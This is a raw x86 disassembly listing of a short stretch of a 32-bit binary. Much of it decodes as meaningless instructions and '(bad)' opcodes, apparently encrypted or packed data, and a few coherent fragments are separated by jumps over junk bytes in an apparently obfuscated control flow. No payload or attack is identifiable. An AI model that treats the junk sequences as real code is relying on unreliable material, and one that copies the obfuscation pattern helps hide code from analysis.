  401956:	inc    ecx
  401957:	xor    esp,DWORD PTR [eax]
  401959:	cld    
  40195a:	push   es
  40195b:	mov    cs:0x8065c557,eax
  401961:	cmp    BYTE PTR [edi],ah
  401963:	mov    cl,0x11
  401965:	rcl    ah,0xb5
  401968:	fwait
  401969:	mov    ebx,0x21fae1a8
  40196e:	cdq    
  40196f:	jg     0x401918
  401971:	mov    BYTE PTR [edx],dh
  401973:	clc    
  401974:	add    esi,ebp
  401976:	inc    edi
  401977:	outs   dx,DWORD PTR ds:[esi]
  401978:	scas   eax,DWORD PTR es:[edi]
  401979:	sbb    edi,ebp
  40197b:	and    edi,DWORD PTR [ebp+0x1e]
  40197e:	mov    ah,0x2
  401980:	out    0x84,eax
  401982:	mov    bh,0x11
  401984:	hlt    
  401985:	je     0x4019f3
  401987:	add    edx,edi
  401989:	inc    esi
  40198a:	xchg   ebp,eax
  40198b:	cdq    
  40198c:	jl     0x4019b7
  40198e:	cmp    BYTE PTR ds:0xe85ecebe,ah
  401994:	pop    ebp
  401995:	rol    DWORD PTR [ebx-0x28],1
  401998:	jne    0x40199c
  40199a:	fs dec ecx
  40199c:	ret    
  40199d:	mov    edi,0x400425ea
  4019a2:	fbld   TBYTE PTR [ecx-0x4cda31c3]
  4019a8:	push   ds
  4019a9:	xor    ebx,ecx
  4019ab:	das    
  4019ac:	mov    bh,0xf6
  4019ae:	mov    DWORD PTR [edi-0x49],ecx
  4019b1:	repnz mov esp,0xa232e909
  4019b7:	retf   
  4019b8:	ret    
  4019b9:	call   0xb0da3720
  4019be:	add    BYTE PTR [ebp-0x72],dh
  4019c1:	pop    ds
  4019c2:	adc    BYTE PTR [eax-0x7e7d3c51],al
  4019c8:	inc    ebp
  4019c9:	mov    al,0xbb
  4019cb:	add    esi,DWORD PTR [edi+ecx*2+0x210f67bd]
  4019d2:	xor    eax,0x116eaf8d
  4019d7:	loope  0x401986
  4019d9:	mov    ebp,eax
  4019db:	mov    edi,DWORD PTR ds:0xb55738be
  4019e1:	push   edx
  4019e2:	xor    al,0x4e
  4019e4:	aas    
  4019e5:	daa    
  4019e6:	pop    eax
  4019e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019e8:	icebp  
  4019e9:	push   esp
  4019ea:	rcr    ecx,cl
  4019ec:	cmp    bh,BYTE PTR [ecx+0x78f931b7]
  4019f2:	push   es
  4019f3:	sbb    BYTE PTR [edx-0x610720c1],0xdd
  4019fa:	loop   0x401a4e
  4019fc:	test   edi,ebx
  4019fe:	or     DWORD PTR [eax-0x522a018],eax
  401a04:	mov    esi,0xc7757637
  401a09:	add    bh,ah
  401a0b:	pop    ss
  401a0c:	jge    0x401a56
  401a0e:	jns    0x401a55
  401a10:	jo     0x401a77
  401a12:	(bad)  
  401a13:	mov    al,ds:0xd33f29ac
  401a18:	imul   edi,DWORD PTR [esp+edi*2],0xffffff8b
  401a1c:	int    0x62
  401a1e:	cmp    ebx,esp
  401a20:	ss and al,ah
  401a23:	adc    dh,BYTE PTR ds:0x79b095c5
  401a29:	pop    ss
  401a2a:	add    ebp,0x784a3d47
  401a30:	fsub   st,st(1)
  401a32:	mov    ch,0xec
  401a34:	jp     0x401a5a
  401a36:	inc    DWORD PTR [esi-0x2373c2e7]
  401a3c:	stos   DWORD PTR es:[edi],eax
  401a3d:	mov    dh,0xeb
  401a3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a40:	mov    ebx,0xa42a62ba
  401a45:	cmp    edx,eax
  401a47:	pop    edx
  401a48:	imul   BYTE PTR [esi-0x351cc847]
  401a4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a4f:	mov    WORD PTR [edx],?
  401a51:	jmp    0x39b4:0xb5f0d23d
  401a58:	jbe    0x4019e7
  401a5a:	jmp    0xbb3e2a28
  401a5f:	add    dl,dh
  401a61:	push   ebp
  401a62:	push   ecx
  401a63:	jo     0x401a8a
  401a65:	sub    edx,DWORD PTR [ecx-0x29]
  401a68:	dec    ecx
  401a69:	lea    esi,[edi]
  401a6b:	inc    ebx
  401a6c:	test   eax,0x127c7968
  401a71:	push   ecx
  401a72:	jp     0x401a0d
  401a74:	and    al,0x29
  401a76:	dec    ecx
  401a77:	mov    DWORD PTR [ebp-0x50],ebx
  401a7a:	jmp    0x401c1b
  401a7f:	xchg   ecx,eax
  401a80:	mov    al,ds:0xe9b3d9b3
  401a85:	push   ecx
  401a86:	jo     0x401aa0
  401a88:	adc    BYTE PTR [esi],bl
  401a8a:	dec    esp
  401a8b:	jns    0x401a21
  401a8d:	pop    ecx
  401a8e:	pop    ds
  401a8f:	push   cs
  401a90:	js     0x401b10
  401a92:	jle    0x401a8e
  401a94:	jg     0x401b14
  401a96:	jle    0x401a18
  401a98:	ret    
  401a99:	lea    ecx,ds:0x1171503f
  401a9f:	iret   
  401aa0:	fldcw  WORD PTR [esi]
  401aa2:	sub    edx,DWORD PTR [esi+0x7f165105]
  401aa8:	loope  0x401a4c
  401aaa:	cmc    
  401aab:	dec    edi
  401aac:	inc    ebp
  401aad:	jmp    0x401a4a
  401aaf:	daa    
  401ab0:	pop    ebp
  401ab1:	add    ecx,edx
  401ab3:	scas   eax,DWORD PTR es:[edi]
  401ab4:	sahf   
  401ab5:	adc    BYTE PTR [esi-0x2a],0x49
  401ab9:	dec    edx
  401aba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401abb:	movntps XMMWORD PTR [ebp+0x5],xmm6
  401abf:	sbb    al,0x9c
  401ac1:	xor    BYTE PTR [esi],ah
  401ac3:	fstp   QWORD PTR [eax+0x37a7e829]
  401ac9:	jne    0x401ab0
  401acb:	jmp    0x401abd
  401acd:	ins    BYTE PTR es:[edi],dx
  401ace:	xor    DWORD PTR [ebp+edx*1+0x176b2583],ecx
  401ad5:	out    dx,eax
  401ad6:	jmp    0xba9b27f6
  401adb:	out    0x4f,al
  401add:	and    eax,0x3a0f582f
  401ae2:	ins    DWORD PTR es:[edi],dx
  401ae3:	les    ecx,FWORD PTR [edx+ebx*4+0x76]
  401ae7:	push   0x3c
  401ae9:	sbb    DWORD PTR [eax],edi
  401aeb:	inc    ebx
  401aec:	and    al,bl
  401aee:	mov    ecx,0x314af298
  401af3:	imul   edi,eax,0x6b694824
  401af9:	jg     0x401b17
  401afb:	xor    BYTE PTR [edi-0x10],dl
  401afe:	jo     0x401b2c
  401b00:	push   ebp
  401b01:	jnp    0x401b7f
  401b03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b04:	cdq    
  401b05:	cmp    BYTE PTR [eax+eax*4+0x1a],0x5
  401b0a:	or     BYTE PTR [ecx],cl
  401b0c:	sar    BYTE PTR [edi],1
  401b0e:	cld    
  401b0f:	cmp    al,0xb3
  401b11:	jmp    0x401b4a
  401b13:	outs   dx,DWORD PTR ds:[esi]
  401b14:	test   BYTE PTR [ebp-0x30617aa7],dl
  401b1a:	adc    dh,BYTE PTR [ebx+0x4]
  401b1d:	fisubr DWORD PTR [edx+0xd]
  401b20:	push   esp
  401b21:	mov    edi,0xb7a2d43e
  401b26:	mov    fs,edx
  401b28:	push   esp
  401b29:	popa   
  401b2a:	inc    edx
  401b2b:	mov    dh,0x30
  401b2d:	int3   
  401b2e:	and    al,0x70
  401b30:	ss and eax,0xa47615f1
  401b36:	push   0x54
  401b38:	in     al,dx
  401b39:	mov    al,ds:0x1e179ce4
  401b3e:	cmp    dh,cl
  401b40:	cmp    cl,BYTE PTR [edx+0x53feb7f5]
  401b46:	push   edi
  401b47:	and    BYTE PTR [esi-0x59eda6be],0x46
  401b4e:	pop    ecx
  401b4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b50:	or     al,0x10
  401b52:	and    DWORD PTR [eax+ebp*1+0x3d],esp
  401b56:	outs   dx,BYTE PTR ds:[esi]
  401b57:	inc    esi
  401b58:	ret    0xd76f
  401b5b:	or     DWORD PTR [edx+0x974b382],ebp
  401b61:	retf   0xf619
  401b64:	pop    es
  401b65:	jne    0x401ba3
  401b67:	hlt    
  401b68:	mov    ecx,0xacf6738c
  401b6d:	retf   0xa82c
  401b70:	push   eax
  401b71:	popa   
  401b72:	cmp    eax,0x4ebf8cb4
  401b77:	(bad)  
  401b78:	lods   al,BYTE PTR ds:[esi]
  401b79:	push   ss
  401b7a:	pushf  
  401b7b:	and    eax,0xdc1896fe
  401b80:	scas   eax,DWORD PTR es:[edi]
  401b81:	pop    ss
  401b82:	icebp  
  401b83:	or     BYTE PTR [edx+edx*4],dh
  401b86:	je     0x401b39
  401b88:	loopne 0x401baa
  401b8a:	add    BYTE PTR [edx-0x59],0x58
  401b8e:	xchg   edx,eax
  401b8f:	lods   al,BYTE PTR ds:[esi]
  401b90:	inc    esi
  401b91:	push   0xffffffda
  401b93:	fiadd  WORD PTR [ebp-0x53]
  401b96:	cmp    al,0x2a
  401b98:	daa    
  401b99:	xchg   esi,eax
  401b9a:	mov    esp,0x26d73f47
  401b9f:	add    eax,0x15dd8a49
  401ba4:	mov    ebp,0x35b54143
  401ba9:	inc    ebx
  401baa:	mov    ecx,0x63a378e8
  401baf:	out    0x3d,al
  401bb1:	out    0x99,eax
  401bb3:	mov    dh,0xc5
  401bb5:	mov    eax,fs:0x23f9f938
  401bbb:	push   0x19
  401bbd:	popa   
  401bbe:	mov    ebx,0x1d5b4d25
  401bc3:	(bad)  
  401bc4:	out    0xb1,al
  401bc6:	hlt    
  401bc7:	jno    0x401bf9
  401bc9:	mov    WORD PTR [ebp+0x15c5012],ss
  401bcf:	mov    ds:0x39b0e6ae,al
  401bd4:	sub    al,0x91
  401bd6:	je     0x401b7b
  401bd8:	push   0xac61dd03
  401bdd:	xchg   ecx,eax
  401bde:	outs   dx,BYTE PTR ds:[esi]
  401bdf:	jp     0x401bb1
  401be1:	test   ch,ch
  401be3:	jae    0x401c3e
  401be5:	rcr    esp,0xba
  401be8:	ins    DWORD PTR es:[edi],dx
  401be9:	frstor [esi+0xd36ecc0]
  401bef:	adc    bl,bl
  401bf1:	popf   
  401bf2:	inc    ecx
  401bf3:	ins    DWORD PTR es:[edi],dx
  401bf4:	cmp    DWORD PTR [edi+0x5a],ebp
  401bf7:	popf   
  401bf8:	lods   eax,DWORD PTR ds:[esi]
  401bf9:	enter  0x1702,0xaf
  401bfd:	cli    
  401bfe:	jne    0x401ba9
  401c00:	mov    esp,0x37d94cd5
  401c05:	daa    
  401c06:	test   BYTE PTR [ebx],dl
  401c08:	jae    0x401c14
  401c0a:	je     0x401c1b
  401c0c:	adc    DWORD PTR [esi+0x32c50f91],ebx
  401c12:	mov    cl,0x8
  401c14:	mov    BYTE PTR [ebp+edi*8-0x46d69ab1],dh
  401c1b:	mov    eax,DWORD PTR [ebp-0x50]
  401c1e:	mov    ecx,DWORD PTR [ebp-0x8]
  401c21:	xor    eax,esi
  401c23:	add    eax,edi
  401c25:	mov    DWORD PTR [ecx],eax
  401c27:	mov    eax,DWORD PTR [ebp-0x24]
  401c2a:	mov    ecx,DWORD PTR [ebp-0x8]
  401c2d:	xor    eax,esi
  401c2f:	jmp    0x401dd0
  401c34:	pop    ss
  401c35:	xor    eax,DWORD PTR [ebx]
  401c37:	mov    dl,0x23
  401c39:	mov    dl,0xb7
  401c3b:	mov    bl,0xfb
  401c3d:	lahf   
  401c3e:	cmc    
  401c3f:	xchg   esp,eax
  401c40:	scas   eax,DWORD PTR es:[edi]
  401c41:	fwait
  401c42:	add    ch,bl
  401c44:	mov    bh,BYTE PTR [ecx+0x7e]
  401c47:	jle    0x401c43
  401c49:	jg     0x401cc9
  401c4b:	jle    0x401c3e
  401c4d:	and    edi,DWORD PTR [edi]
  401c4f:	push   0x718738c0
  401c54:	push   ebx
  401c55:	mov    BYTE PTR [eax+edx*2-0x1b],bl
  401c59:	push   0xb3fc19ec
  401c5e:	push   edi
  401c5f:	mov    BYTE PTR [ebx],ch
  401c61:	jno    0x401c01
  401c63:	jg     0x401c24
  401c65:	in     eax,dx
  401c66:	jmp    0x401c7b
  401c68:	push   cs
  401c69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c6a:	mov    bh,0x7f
  401c6c:	add    DWORD PTR [edx-0x39ebc1e6],ecx
  401c72:	sub    BYTE PTR [eax+0x25f1f8a],al
  401c78:	add    BYTE PTR [edx+0x3dacd94e],bl
  401c7e:	fistp  WORD PTR [esp+ecx*2-0xc450a79]
  401c85:	cmp    eax,esp
  401c87:	sub    eax,0xc4af21c6
  401c8c:	cmp    bl,ch
  401c8e:	imul   edi,DWORD PTR [eax-0x3f456f75],0xc053e0c1
  401c98:	mov    ecx,0xa65c5cb0
  401c9d:	sub    eax,0x8b87bcba
  401ca2:	push   esi
  401ca3:	jecxz  0x401cf6
  401ca5:	mov    edi,ebp
  401ca7:	and    BYTE PTR [edi+0x263b0e07],bh
  401cad:	jns    0x401c8b
  401caf:	mov    ah,0x17
  401cb1:	mov    ds:0xe85264ee,eax
  401cb6:	jno    0x401d06
  401cb8:	in     al,dx
  401cb9:	xchg   ebx,eax
  401cba:	fwait
  401cbb:	xchg   edi,eax
  401cbc:	xchg   BYTE PTR [edx-0x58],bh
  401cbf:	and    BYTE PTR [ebp-0xe0a0fa8],bl
  401cc5:	xor    eax,0xef5b212d
  401cca:	daa    
  401ccb:	and    al,0xf2
  401ccd:	sbb    bl,0x37
  401cd0:	push   ecx
  401cd1:	ins    BYTE PTR es:[edi],dx
  401cd2:	jmp    0xd2bd:0xc6e4c1bd
  401cd9:	mov    edx,DWORD PTR [edi]
  401cdb:	daa    
  401cdc:	push   cs
  401cdd:	je     0x401c76
  401cdf:	push   ecx
  401ce0:	retf   
  401ce1:	(bad)  
  401ce2:	xchg   ebx,eax
  401ce3:	adc    eax,0xf945fc38
  401ce8:	xor    cl,al
  401cea:	sbb    edx,DWORD PTR [ebp-0x1e]
  401ced:	dec    ebp
  401cee:	std    
  401cef:	jb     0x401d6c
  401cf1:	jo     0x401d58
  401cf3:	sti    
  401cf4:	or     eax,0xbc48ac38
  401cf9:	mov    esi,0xd2b3ab94
  401cfe:	add    eax,0x251f6b41
  401d03:	sub    DWORD PTR [edi-0x6f],0x19
  401d07:	jo     0x401d76
  401d09:	fwait
  401d0a:	xchg   edi,eax
  401d0b:	(bad)  
  401d0c:	out    dx,al
  401d0d:	out    dx,eax
  401d0e:	inc    ecx
  401d0f:	cmp    al,dl
  401d11:	cwde   
  401d12:	imul   esi,DWORD PTR [eax],0x9641e47d
  401d18:	jmp    DWORD PTR [ebx+eax*8+0x32]
  401d1c:	shl    DWORD PTR [edx-0x78af1d73],cl
  401d22:	(bad)  
  401d23:	jb     0x401d16
  401d25:	sub    BYTE PTR [edi+0x4853ba8d],ch
  401d2b:	adc    esp,DWORD PTR [edi]
  401d2d:	jae    0x401cb9
  401d2f:	(bad)  
  401d30:	mov    BYTE PTR [esi+0x10],ah
  401d33:	mov    ds:0x82f6c89b,al
  401d38:	or     eax,0x2c08c280
  401d3d:	idiv   ch
  401d3f:	nop
  401d40:	jmp    0xb417:0x82160b19
  401d47:	jae    0x401d31
  401d49:	cmp    ebp,0x129368d2
  401d4f:	ror    ecx,0x40
  401d52:	mov    ds:0x6a098e47,al
  401d57:	popf   
  401d58:	inc    esp
  401d59:	shl    ah,1
  401d5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d5c:	xor    BYTE PTR [edi+0x32],bl
  401d5f:	popf   
  401d60:	aas    
  401d61:	and    eax,0x7f4c7fec
  401d66:	push   edx
  401d67:	cmp    BYTE PTR [edx],0x3e
  401d6a:	sar    ebp,0xfe
  401d6d:	pop    ebp
  401d6e:	mov    edi,edi
  401d70:	icebp  
  401d71:	cwde   
  401d72:	mov    ch,0x5e
  401d74:	stos   BYTE PTR es:[edi],al
  401d75:	enter  0xe23f,0xf6
  401d79:	xor    DWORD PTR [ecx],eax
  401d7b:	dec    edi
  401d7c:	push   esp
  401d7d:	(bad)  
  401d7e:	mov    ebp,DWORD PTR [edi+0x57]
  401d81:	fmul   QWORD PTR [ebx+0x56381875]
  401d87:	mov    dl,al
  401d89:	icebp  
  401d8a:	mov    ds:0xf7e63d61,eax
  401d8f:	push   ebp
  401d90:	repnz into 
  401d92:	in     al,0x42
  401d94:	in     eax,0xa0
  401d96:	add    BYTE PTR [ecx-0x15a299a6],al
  401d9c:	adc    eax,0x2dd0469b
  401da1:	mov    al,ds:0x524b9dab
  401da6:	aam    0x13
  401da8:	xchg   edx,edi
  401daa:	or     al,BYTE PTR [ebx+0x4a7f9322]
  401db0:	test   BYTE PTR [edi+0x11],bl
  401db3:	cmp    al,dl
  401db5:	inc    esi
  401db6:	jmp    0x401dcc
  401db8:	jp     0x401e05
  401dba:	inc    ecx
  401dbb:	repz int 0x1d
  401dbe:	lea    eax,[edx+esi*8+0x4f]
  401dc2:	sub    ebx,DWORD PTR [ebx+0x571fcbff]
  401dc8:	sbb    eax,0xf4d0777c
  401dcd:	test   al,0xfc
  401dcf:	xor    al,BYTE PTR [ebx]
  401dd1:	(bad)  
  401dd2:	mov    DWORD PTR [ecx+0x4],eax
  401dd5:	mov    eax,DWORD PTR [ebp-0x2c]
  401dd8:	mov    ecx,DWORD PTR [ebp-0x8]
  401ddb:	mov    DWORD PTR [ecx+0x8],eax
  401dde:	mov    eax,DWORD PTR [ebp-0x30]
  401de1:	mov    ecx,DWORD PTR [ebp-0x8]
  401de4:	mov    DWORD PTR [ecx+0xc],eax
  401de7:	mov    eax,DWORD PTR [ebp-0x34]
  401dea:	mov    ecx,DWORD PTR [ebp-0x8]
  401ded:	mov    DWORD PTR [ecx+0x10],eax
  401df0:	mov    eax,eax
  401df2:	mov    eax,DWORD PTR [ebp-0x20]
  401df5:	xor    eax,esi
  401df7:	add    eax,edi
  401df9:	jmp    0x401f9a
  401dfe:	mov    ah,0x22
  401e00:	les    eax,FWORD PTR [eax+edx*2]
  401e03:	loopne 0x401e79
  401e05:	mov    dl,0xc7
  401e07:	xor    DWORD PTR [eax-0x49d524c8],ebp
  401e0d:	jb     0x401e25
  401e0f:	pop    es
  401e10:	jle    0x401e90
  401e12:	cli    
  401e13:	jg     0x401e93
  401e15:	jle    0x401db7
  401e17:	mov    eax,ds:0x597368b1
  401e1c:	out    dx,al
  401e1d:	cmp    eax,0x64603969
  401e22:	(bad)  
  401e24:	lds    ecx,FWORD PTR [eax]
  401e26:	or     BYTE PTR [eax+0x6c],ah
  401e29:	repz adc esi,DWORD PTR [ebx-0x4c]
  401e2d:	sub    DWORD PTR [esi-0x27e82d98],esi
  401e33:	inc    ebp
  401e34:	pop    edi
  401e35:	xor    eax,0xa3bf7c82
  401e3a:	imul   ebx,DWORD PTR [edx+esi*4+0x13],0xb02014eb
  401e42:	sub    bh,BYTE PTR [edi]
  401e44:	mov    eax,ds:0xa723b3b5
  401e49:	ret    
  401e4a:	iret   
  401e4b:	inc    ebp
  401e4c:	push   esp
  401e4d:	inc    eax
  401e4e:	mov    ecx,ds
  401e50:	cli    
  401e51:	aas    
  401e52:	nop
  401e53:	adc    ah,ch
  401e55:	test   eax,0x898cf637
  401e5a:	cmp    al,0xd5
  401e5c:	push   edi
  401e5d:	cwde   
  401e5e:	push   ss
  401e5f:	bound  edi,QWORD PTR [si]
  401e62:	lock add esp,DWORD PTR [eax]
  401e65:	mov    ?,WORD PTR [ecx]
  401e67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e68:	adc    eax,0x5956c353
  401e6d:	sahf   
  401e6e:	xchg   esp,eax
  401e6f:	sub    eax,0x1f495709
  401e74:	mov    dh,0x5b
  401e76:	dec    ecx
  401e77:	pop    ebx
  401e78:	push   DWORD PTR [edi]
  401e7a:	mov    esi,0x38137a9a
  401e7f:	mov    ah,0x34
  401e81:	pushf  
  401e82:	gs mov cl,0x9b
  401e85:	jmp    0x401e9f
  401e87:	push   ebx
  401e88:	inc    edi
  401e89:	(bad)
  401e8c:	add    BYTE PTR [edi],dh
  401e8e:	call   0x58627ca8
  401e93:	mov    al,0xb3
  401e95:	test   BYTE PTR [ebx-0x1],cl
  401e98:	cwde   
  401e99:	jbe    0x401e7f
  401e9b:	push   esp
  401e9c:	mov    bh,dl
  401e9e:	test   BYTE PTR [esi-0x24],ah
  401ea1:	fs sub eax,0x9dc9918b
  401ea7:	cmp    cl,BYTE PTR [eax*2+0xacd3e9d]
  401eae:	cli    
  401eaf:	push   edx
  401eb0:	mov    ebp,0xd10ac257
  401eb5:	aas    
  401eb6:	inc    esi
  401eb7:	pop    edx
  401eb8:	arpl   WORD PTR [ecx],sp
  401eba:	inc    esp
  401ebb:	and    DWORD PTR [ecx-0x51097777],esp
  401ec1:	xor    al,BYTE PTR [esi]
  401ec3:	(bad)  
  401ec4:	out    dx,eax
  401ec5:	mov    ah,0xc1
  401ec7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ec8:	add    eax,0x23800bfb
  401ecd:	and    al,BYTE PTR [eax-0x45]
  401ed0:	pop    ss
  401ed1:	cmp    esi,0x1e82aa25
  401ed7:	sub    esi,DWORD PTR [ebx+0x70]
  401eda:	in     al,0x21
  401edc:	xchg   DWORD PTR [eiz*4+0x6579c4f1],ecx
  401ee3:	mov    bh,0xbf
  401ee5:	ret    
  401ee6:	mov    edi,0x92768d01
  401eeb:	rcl    BYTE PTR [edx],1
  401eed:	sub    DWORD PTR [edi],ecx
  401eef:	cmp    eax,0x33865fb4
  401ef4:	sbb    DWORD PTR [ecx+0x3fe96499],ecx
  401efa:	pop    es
  401efb:	dec    edx
  401efc:	nop
  401efd:	xchg   ebp,eax
  401efe:	dec    ebx
  401eff:	(bad)  
  401f00:	and    BYTE PTR [ebx-0x67a0bf0d],cl
  401f06:	ins    BYTE PTR es:[edi],dx
  401f07:	pop    es
  401f08:	add    ah,BYTE PTR [ebp+0x7]
  401f0b:	or     ax,0xfe6e
  401f0f:	mov    BYTE PTR [edi-0x30],dl
  401f12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f13:	imul   ecx,DWORD PTR [ebx+0x4835bb9d],0xb561e60c
  401f1d:	mov    bl,0xe
  401f1f:	and    al,0x32
  401f21:	inc    edx
  401f22:	mov    edi,0xa87b702
  401f27:	dec    eax
  401f28:	out    0x52,al
  401f2a:	push   esp
  401f2b:	jl     0x401ecc
  401f2d:	sub    al,0x9e
  401f2f:	test   BYTE PTR [edi-0x33ce306f],bh
  401f35:	inc    esi
  401f36:	aas    
  401f37:	pop    ds
  401f38:	out    0xa6,eax
  401f3a:	lds    edx,FWORD PTR [ecx+0x741ce295]
  401f40:	loope  0x401f81
  401f42:	inc    ebp
  401f43:	sbb    eax,0xc5460cd6
  401f48:	into   
  401f49:	adc    BYTE PTR [ecx],ah
  401f4b:	ror    ebp,1
  401f4d:	ins    DWORD PTR es:[edi],dx
  401f4e:	push   cs
  401f4f:	dec    ebp
  401f50:	les    ebp,FWORD PTR [esp+ecx*1]
  401f53:	loopne 0x401f10
  401f55:	mov    DWORD PTR [esi-0x4a25561d],ebp
  401f5b:	and    dh,BYTE PTR [edx+0x6d]
  401f5e:	(bad)  
  401f5f:	pusha  
  401f60:	sbb    eax,0xc41293d6
  401f66:	rcl    DWORD PTR [ebx+0x1a],1
  401f69:	ja     0x401eee
  401f6b:	pop    esi
  401f6c:	loop   0x401f51
  401f6e:	(bad)  
  401f6f:	imul   DWORD PTR [ebp-0x548f822e]
  401f75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f76:	or     al,0xbd
  401f78:	test   eax,0xd13307e1
  401f7d:	in     al,dx
  401f7e:	sub    ecx,DWORD PTR [esi+ebx*4]
  401f81:	neg    ah
  401f83:	mov    ds:0x3eec08d0,eax
  401f88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f89:	sti    
  401f8a:	jg     0x401f18
  401f8c:	push   esi
  401f8d:	loop   0x401fee
  401f8f:	sbb    edi,eax
  401f91:	jb     0x401f64
  401f93:	sub    bh,BYTE PTR [edx-0x3b48606c]
  401f99:	mov    DWORD PTR [edi],ecx
  401f9b:	test   BYTE PTR [ebp+0x3],ch
  401f9e:	add    BYTE PTR [eax],al
  401fa0:	lea    eax,[ebp-0x98]
  401fa6:	push   eax
  401fa7:	mov    eax,DWORD PTR [ebp-0x1c]
  401faa:	xor    eax,esi
  401fac:	add    eax,edi
  401fae:	jmp    0x40214f
  401fb3:	pop    ecx
  401fb4:	and    al,0xad
  401fb6:	aas    
  401fb7:	jno    0x402010
  401fb9:	imul   esp,DWORD PTR [eax-0x4769416e],0x2f69f4e
  401fc3:	xchg   edx,eax
  401fc4:	add    al,0x7e
  401fc6:	jle    0x401fc2
  401fc8:	jg     0x402048
  401fca:	jle    0x401fcb
  401fcc:	ret    0xf228
  401fcf:	xchg   esi,eax
  401fd0:	inc    ebx
  401fd1:	inc    edx
  401fd2:	mov    ch,0x5a
  401fd4:	jmp    0x402016
  401fd6:	aad    0xb3
  401fd8:	mov    cl,ch
  401fda:	cs cli 
  401fdc:	xchg   eax,ecx
  401fde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401fdf:	or     esi,ebp
  401fe1:	les    esi,FWORD PTR [ebp+0x7f]
  401fe4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fe5:	dec    ebp
  401fe6:	sahf   
  401fe7:	jecxz  0x402022
  401fe9:	cwde   
  401fea:	push   ebp
  401feb:	add    al,0xea
  401fed:	or     edx,eax
  401fef:	mov    ah,0x78
  401ff1:	sbb    ah,BYTE PTR [ebx]
  401ff3:	out    0x19,eax
  401ff5:	pushf  
  401ff6:	inc    edx
  401ff7:	jbe    0x40204b
  401ff9:	gs stos BYTE PTR es:[edi],al
  401ffb:	in     eax,0xe4
  401ffd:	inc    edi
  401ffe:	mov    ds:0x45e65800,al
  402003:	hlt    
  402004:	pop    edx
  402005:	aas    
  402006:	lods   eax,DWORD PTR ds:[esi]
  402007:	fsub   QWORD PTR [edx]
  402009:	mov    ds:0xdd7dfd2e,eax
  40200e:	data16 and ah,BYTE PTR [ecx+0x144efda]
  402015:	push   esi
  402016:	push   esp
  402017:	je     0x402041
  402019:	imul   esp,edx,0x8b728d44
  40201f:	aam    0xaf
  402021:	aaa    
  402022:	imul   esi,DWORD PTR [edx-0x20],0x55
  402026:	pop    es
  402027:	sbb    DWORD PTR [ebx+0x9ba1b20],ebp
  40202d:	jl     0x40208d
  40202f:	dec    eax
  402030:	ds inc ecx
  402032:	les    esi,FWORD PTR [esp+ebp*2]
  402035:	aam    0xce
  402037:	dec    ecx
  402038:	and    bh,cl
  40203a:	rcl    DWORD PTR [edi],1
  40203c:	adc    eax,0x8bdefaa5
  402041:	jmp    0xf5432b46
  402046:	mov    dl,0x3e
  402048:	out    0xe8,al
  40204a:	dec    esi
  40204b:	imul   ebx,DWORD PTR [edx+0x41],0xffffffe4
  40204f:	sbb    DWORD PTR [eax],esp
  402051:	(bad)
  402055:	jmp    0xe2ba:0xb4ffdafb
  40205c:	repnz and DWORD PTR [ecx-0x3f],ebp
  402060:	inc    ebx
  402061:	mov    eax,ds:0x41f3c2e5
  402066:	sar    ebx,0xe4
  402069:	adc    al,0x5e
  40206b:	pop    eax
  40206c:	and    al,0x2c
  40206e:	pop    bp
  402070:	cmp    ebp,DWORD PTR [ecx+0x624491d9]
  402076:	or     BYTE PTR cs:[edx+0x6bbdabbb],ch
  40207d:	enter  0xc53f,0x72
  402081:	cmc    
  402082:	lods   eax,DWORD PTR ds:[esi]
  402083:	push   edi
  402084:	sub    al,0xb3
  402086:	mov    bh,0xc0
  402088:	test   al,0x28
  40208a:	sar    esp,1
  40208c:	pop    esp
  40208d:	jne    0x40205b
  40208f:	(bad)  
  402091:	shl    DWORD PTR [ebx],1
  402093:	mov    WORD PTR [esi+0x50],?
  402096:	push   ds
  402097:	xor    bh,BYTE PTR [esi-0x69b3bb1a]
  40209d:	hlt    
  40209e:	popa   
  40209f:	fwait
  4020a0:	cmp    eax,0xa3f6da3e
  4020a5:	cmp    edx,eax
  4020a7:	mov    edi,0x2f327408
  4020ac:	dec    esi
  4020ad:	dec    esi
  4020ae:	push   esi
  4020af:	inc    ebx
  4020b0:	push   cs
  4020b1:	jg     0x4020e9
  4020b3:	repnz push 0xffffffde
  4020b6:	or     DWORD PTR [ecx-0x16],0x13
  4020ba:	pushf  
  4020bb:	push   esp
  4020bc:	and    al,0x6f
  4020be:	stos   BYTE PTR es:[edi],al
  4020bf:	inc    edx
  4020c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020c1:	fimul  WORD PTR [ecx-0x2ff626d]
  4020c7:	push   ds
  4020c8:	scas   al,BYTE PTR es:[edi]
  4020c9:	jle    0x402127
  4020cb:	push   ecx
  4020cc:	jmp    0xc7012a3c
  4020d1:	xchg   ebp,ebx
  4020d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4020d4:	pop    ecx
  4020d5:	in     al,0x6b
  4020d7:	mov    ch,0x8c
  4020d9:	mov    edx,0x95213ca0
  4020de:	sti    
  4020df:	adc    eax,DWORD PTR [eax+0x3]
  4020e2:	std    
  4020e3:	retf   0xfd2a
  4020e6:	pop    es
  4020e7:	adc    cl,BYTE PTR [edi+0xb]
  4020ea:	scas   al,BYTE PTR es:[edi]
  4020eb:	retf   
  4020ec:	pop    ss
  4020ed:	or     DWORD PTR [edi-0xa],eax
  4020f0:	jg     0x402156
  4020f2:	sbb    dh,BYTE PTR [eax]
  4020f4:	jge    0x4020e4
  4020f6:	inc    ebx
  4020f7:	pusha  
  4020f8:	jno    0x4020c0
  4020fa:	imul   esi,DWORD PTR [ecx-0x6b],0xffffffed
